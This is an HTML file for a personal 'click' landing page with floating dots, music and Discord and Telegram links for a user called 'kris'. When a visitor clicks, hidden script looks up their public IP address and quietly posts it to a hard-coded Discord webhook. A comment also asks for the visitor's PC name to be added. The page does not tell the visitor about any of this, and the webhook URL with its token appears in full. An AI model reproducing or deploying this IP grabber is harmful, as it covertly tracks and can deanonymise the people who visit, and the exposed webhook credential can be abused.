<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Interactive Page</title>
    <style>
        body {
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: black;
            overflow: hidden;
            font-family: Arial, sans-serif;
            color: white;
            transition: background-image 1s ease-in-out;
        }
        #message {
            color: white;
            font-size: 24px;
            text-align: center;
            cursor: pointer;
        }
        .hidden {
            display: none;
        }
        .dot {
            position: absolute;
            width: 5px;
            height: 5px;
            background-color: white;
            border-radius: 50%;
        }
        #content {
            display: none;
            text-align: center;
        }
        #content .icons {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
            margin-top: 10px;
        }
        #content .icons a {
            display: inline-block;
        }
        #content .icons img {
            width: 24px;
            height: 24px;
        }
        #line {
            width: 200px;
            border-top: 1px solid white;
            margin: 10px auto;
        }
    </style>
</head>
<body>
    <div id="message">click</div>
    <div id="content">
        <div>kris</div>
        <div id="line"></div>
        <div>@ondabandoo
        </div>
        <div class="icons">
            <a href="https://discord.com/your-discord-link" target="_blank">
                <img src="discord-icon.png" alt="Discord">
            </a>
            <a href="https://t.me/your-telegram-link" target="_blank">
                <img src="telegram-icon.png" alt="Telegram">
            </a>
        </div>
        <audio id="background-music" src="your-music.mp3" loop></audio>
    </div>

    <script>
        document.getElementById('message').addEventListener('click', async function() {
            this.classList.add('hidden');
            document.getElementById('content').style.display = 'block';
            document.body.style.backgroundImage = 'url("your-gif.gif")';
            document.body.style.backgroundSize = 'cover';
            document.body.style.backgroundRepeat = 'no-repeat';
            document.body.style.backgroundPosition = 'center';
            const music = document.getElementById('background-music');
            music.play().catch(error => console.log('Playback error:', error));

            // Fetch IP address
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const ip = ipData.ip;

                // Get PC name - Placeholder. Replace with actual method if possible.
                const pcName = 'Unknown PC'; // Replace with a method to get the actual PC name if possible

                // Send data to Discord webhook
                const webhookUrl = 'https://discord.com/api/webhooks/1268334249409511456/IuqrvlvOboe9apIWQB_DMW7jKPkQkF8HVPvQrlJvTO04P_SckK01361--WGE_vxegEfT'; // Replace with your Discord webhook URL
                const payload = {
                    embeds: [{
                        title: 'New Click Event Detected!',
                        description: `IP Address: ${ip}\nPC Name: ${pcName}`,
                        color: 0x00FF00, // Embed color (green)
                        image: {
                            url: 'https://example.com/your-image.png' // Replace with the URL of your image
                        },
                        footer: {
                            text: 'Generated by Your Webpage'
                        }
                    }]
                };

                await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                });
            } catch (error) {
                console.error('Error fetching IP or sending data:', error);
            }
        });

        function createDot(x, y) {
            const dot = document.createElement('div');
            dot.className = 'dot';
            dot.style.left = `${x}px`;
            dot.style.top = `${y}px`;
            document.body.appendChild(dot);
            moveDot(dot);
        }

        function moveDot(dot) {
            let x = parseFloat(dot.style.left);
            let y = parseFloat(dot.style.top);
            const speedX = (Math.random() - 0.5) * 2;
            const speedY = (Math.random() - 0.5) * 2;

            function update() {
                x += speedX;
                y += speedY;

                if (x < 0) x = window.innerWidth;
                if (x > window.innerWidth) x = 0;
                if (y < 0) y = window.innerHeight;
                if (y > window.innerHeight) y = 0;

                dot.style.left = `${x}px`;
                dot.style.top = `${y}px`;

                requestAnimationFrame(update);
            }
            update();
        }

        for (let i = 0; i < 50; i++) {
            createDot(Math.random() * window.innerWidth, Math.random() * window.innerHeight);
        }
    </script>
</body>
</html>
